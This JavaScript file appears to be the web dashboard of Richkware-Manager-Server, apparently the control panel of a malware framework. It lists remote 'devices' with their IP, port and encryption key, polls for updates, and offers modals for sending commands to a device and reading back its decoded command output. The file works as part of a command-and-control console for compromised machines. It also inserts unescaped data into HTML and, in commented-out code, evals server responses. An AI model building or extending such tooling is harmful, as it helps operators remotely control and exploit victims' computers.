function loadDevicesTable() {
    console.log("loadDevicesTable")
    $.get("devicesList", {channel: "webapp"}, function (data) {
        var JSONdata = JSON.parse(data)

        //device = JSON.parse(DeviceJSON);
        //document.getElementById("Email").innerHTML = Person.email;

        //status : "success", "notmodified", "error", "timeout", or "parsererror"
        if (JSONdata.statusCode == 1000) {
            var devices = JSONdata.message
            loadDevicesJSONtoTable(devices)
        } else if (JSONdata.statusCode == 2100) {
            alert("You are not logged in. You are being redirected to the Login Page");
            window.location.replace = "/Richkware-Manager-Server/login.html";
        } else {
            alert(JSONdata.message)
        }
    })
}

function createDevicesTableHeader() {
    console.log("createDevicesTableHeader")
    var devicesTable = document.getElementById("devicesTable");
    devicesTable.innerHTML = "";

    var thead = document.createElement("thead");
    var row = document.createElement("tr");
    row.innerHTML = ( //"<th>Index</th>" +
        "<th>Name</th>" +
        "<th>Last Connection</th>" +
        "<th>Associated User</th>" +
        "<th>Commands</th>" +
        "<th>Commands Output</th>" +
        "<th colspan='3'>Actions</th>");

    thead.appendChild(row);
    devicesTable.appendChild(thead);
    console.log("tableHeader")
}

function loadDevicesJSONtoTable(devicesListJSON) {
    console.log("loadDevicesJSONtoTable")
    createDevicesTableHeader();

    var devicesList = JSON.parse(devicesListJSON)//jQuery.parseJSON(devicesListJSON);

    var tbody = document.createElement("tbody");

    console.log("devicesList: " + devicesList + " type: " + typeof(devicesList) + " length: " + devicesList.length)
    //var index = 0;
    //while (devicesList[index] != null) {
    //for(var device in devicesList){
    for (var i = 0; i < devicesList.length; ++i) {
//        $.each(devicesList, function (index, value) {
        //var device = devicesList[index];
//            var device = value;
        console.log(devicesList[i])

        var name = devicesList[i].name;
        var IP = devicesList[i].ip;
        var serverPort = devicesList[i].serverPort;
        var lastConnection = devicesList[i].lastConnection;
        var encryptionKey = devicesList[i].encryptionKey;
        var associatedUser = devicesList[i].associatedUser;
        var commands = devicesList[i].commands;
        var commandsOutput = devicesList[i].commandsOutput;

        var row = document.createElement("tr");
        row.id = "tableRow" + i;
        var collapse = "<div class='collapse' id='coll-" + name + "' aria-labelledby='tableRow" + i + "'><table class='table'><tr><td>IP:Port</td><td>" + IP + ":" + serverPort + "</td></tr><tr><td>Ecryption Key</td><td> + encryptionKey + </td></tr></table></div>";
        row.innerHTML = (
            //"<td>" + (index + 1) + "</td>" +
            "<td><a tabindex='0' onclick='popInfo()' type='button' data-html=\"true\" class='btn btn-outline-info' data-toggle='popover' title='" + name + " Info' data-content='<div><p>IP:Port - " + IP + ":" + serverPort + "</p><p>Encryption Key - " + encryptionKey + "</p></div>'>" + name + "</a></td>" +
            //"<td><button class=\"btn\" data-toggle=\"collapse\" data-target=\"#coll-" + name + "\" aria-expanded=\"true\" aria-controls=\"coll-" + name +"\">" + name + "</button>" +
            "<td>" + lastConnection + "</td>" +
            "<td>" + associatedUser + "</td>" +
            "<td>" + commands + "</td>" +
            "<td>" + commandsOutput + "</td>" +
            "<td><button title='Insert Commands' type=\"button\" id=\"manage#" + name + "\" class=\"btn btn-secondary\" onclick=\"commandsM('" + name + "')\"><span class=\"fa fa-terminal\"></span></button></td>" +
            "<td><button title='Output' type=\"button\" id=\"commandsOutput#" + name + "\" class=\"btn btn-primary\" onclick=\"outputM('" + name + "')\"><span class=\"fa fa-eye\"></span></button></td>" +
            "<td><button title='Remove' type=\"button\" id=\"remove#" + name + "#" + i + "\" class=\"btn btn-danger\" onclick=\"deleteDevice('" + name + "', '" + i + "')\"><span class=\"fa fa-trash\"></span></button></td>");



        tbody.appendChild(row);
        //      index++
    }
    devicesTable.appendChild(tbody);
}

function infoDev(devL){
    return '<table class="table" style="padding-left:50px;">'+
        '<tr>'+
        '<td>IP:Port</td>'+
        '<td>'+devL.ip + ':' + devL.serverPort +'</td>'+
        '</tr>'+
        '<tr>'+
        '<td>EncryptionKey:</td>'+
        '<td>'+devL.encryptionKey+'</td>'+
        '</tr>'+
        '</table>';
}

function popInfo(){
    $("[data-toggle=popover]").popover();
}

//Open CommandsModal
function commandsM(device){
    console.log(device);
    $('#ModalCommandTitle').text("Device: " + device);
    $('#ModalCommandTitle').val(device);
    $('#text-area').prop('readonly', false);
    $('#text-area').val("")
    $('#submit-commands').show();
    $('#ModalCommand').modal('show');
}

//Open CommandOutputModal
function outputM(device){
    console.log(device);
    $('#ModalCommandTitle').text("Device: " + device);
    $('#ModalCommandTitle').val(device);
    $('#text-area').prop('readonly', true);
    $('#submit-commands').hide();
    getOutput(device);
}

function handleReverseCommandOutput(encCommands) {
    //TODO PROVVISORIO: decidere come vogliamo fare (tipo di dato da ritornare e tutte cose...)
    if (encCommands != "") {
        var previous = ""
        $("#text-area").val(atob(encCommands[0]))
        for (var i = 1; i < encCommands.length; ++i) {
            previous = $("#text-area").val()
            $('#text-area').val(previous + "\n" + atob(encCommands[i]))
        }
    } else {
        $('#text-area').val("No output found for this device!")
    }
    $('#ModalCommand').modal('show');
}

function deleteDevice(device, indexTableRow) {
    $.ajax({
        url: '/Richkware-Manager-Server/device?name=' + device,
        type: 'DELETE',
        success: function (result) {
            $("#tableRow" + indexTableRow).remove();
        }
    });
}


/*
function loadUsersTable() {
    createDevicesTableHeader();

    request = null;

    // microsoft explorer
    if (window.XMLHttpRequest)
        request = new XMLHttpRequest();
    else
        request = new ActiveXObject("Microsoft.XMLHTTP");

    request.onreadystatechange = newConnection;
    request.open("GET", "/Richkware-Manager-Server/DevicesList", true, null, null);

    request.send(null);
}


function newConnection() {
    if (request.readyState != 4) {
        //alert("request.readystate: "+ request.readystate)
        return;
    }
    if (request.status != 200) {
        alert("request.status :  " + request.status)
        return;
    }

    var JSON = request.responseText;
    var result;
    eval("result = " + JSON);

    loadUsersJSONtoTable(result);

}*/

$(document).ready(function() {
    loadDevicesTable();
    setInterval(loadDevicesTable, 30000);

    $('#devicesTable tbody').on('click', 'button.btn', function(){
        var tr = $(this).closest('tr');
        var row = table.row( tr );

        if(row.child.isShown()){
            // This row is already open - close it
            row.child.hide();
            tr.removeClass('shown');
        } else {
            // Open this row
            row.child(format(row.data())).show();
            tr.addClass('shown');
        }
    });

    $("[id*=remove]").click(function () {
        var dev = event.target.id.split("#")[1];
        var index = event.target.id.split("#")[2];
        $.delete("device", {name: dev}, function () {
            $("#tableRow" + index).remove()
        })
    });

    $("[id*=manage]").click(function () {
        console.log("element clicked -> redirecting")
        var name = event.target.id.split("#")[1]
        window.location.replace = "/Richkware-Manager-Server/reverse-commands.html?device=" + name;
    });

    $("#refreshButton").click(function () {
        console.log("clicked refresh button")
        loadDevicesTable()
    })

    /* sc.onload = function () {
         document.getElementById("Logout").innerHTML = lang.logout;
         document.getElementById("Lang").innerHTML = lang.lang;
     };
     */

    /*
    function EditDevicesTableField(name, IP, serverPort, lastConnection) {
        var editForm = document.getElementById("EditForm");
        editForm.style.display = "inline";

        var editButton = document.getElementById("AddForm");
        //editButton.style.display = "none";

        document.getElementById("name_OE").value = name;
        document.getElementById("name_E").value = name;
        document.getElementById("IP_OE").value = IP;
        document.getElementById("IP_E").value = IP;
        document.getElementById("serverPort_OE").value = serverPort;
        document.getElementById("serverPort_E").value = serverPort;
        document.getElementById("lastConnection_OE").value = lastConnection;
        document.getElementById("lastConnection_E").value = lastConnection;
        document.getElementById("encryptionKey_OE").value = lastConnection;
        document.getElementById("encryptionKey_E").value = lastConnection;

    }*/




})
